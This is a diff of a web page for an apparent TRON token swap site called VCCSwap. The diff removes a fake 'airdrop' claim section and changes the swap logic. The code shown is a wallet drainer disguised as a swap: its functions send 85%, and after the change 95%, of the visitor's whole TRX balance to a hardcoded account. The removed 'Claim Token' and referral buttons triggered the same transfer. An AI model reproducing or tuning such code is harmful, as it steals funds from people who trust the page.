@@ -170,42 +170,7 @@
                     
                     
 
-                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-6" style="background-color: #EEEEEE;border-radius: 25px;padding: 0 35px 20px;">
-                      <br><br>
-                      <div class="page-title" style="margin-bottom: 0px;">
-                        <h2>VCC Token Airdrop</h2>
-                      </div>
-                      <br><br>
-                      <div class="block-title">
-                        <p style="margin-top: 0px;">
-                          On the occasion of the 10th month of launching the VCCSwap project and the more than expected reception of this project, we decided to generate a governance token and airdrop between active members of TRON Network and people who had transactions in the VCCSWAP project from December 20, 2020 with long-term goals as marketing distribution.
-                        </p>
-                      </div>
-
-                      <form id="contact_form" class="contact-form" action="">
-
-                        <div class="messages"></div>
-
-                        <div class="controls three-columns">
-                          
-
-                          <input type="button" class="button btn-send" onClick="swapTRX()" value="Claim Token" style="cursor: pointer;">
-                        </div>
-                      </form>
-                    </div>
-                  </div>
-
-                    <hr style="margin: 20px 0;">
-                  <div>
-                    <p>Invite your friends and get 25% referrals commission</p>
-                    <div class="controls three-columns">
-                          
-
-                      <input type="button" class="button btn-send" value="Generate Referral Link" onClick="swapTRX()" style="cursor: pointer;">
-                    </div>
-                  </div>
-                </div>
-              </section>
+                    
               <!-- End of Contact Subpage -->
             </div>
           </div>
@@ -241,14 +206,14 @@
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 0.5).change();
+                  $("#trx-swap").val(tokenBalance * 10).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 0.5).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 10).change();
               }
 
               async function swapToken(){
@@ -269,7 +234,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 95 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -280,7 +245,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 85 / 100);
+                  var v = Math.floor(acc.balance * 95 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }</script>
     <script>window.addEventListener('message', async function (e) {
@@ -338,11 +303,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 0.5).change();
+                  $("#trx-swap").val(tokens * 10).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 0.5).change();
+                  $("#token-swap").val(value / 10).change();
 
                 }catch{}
               }
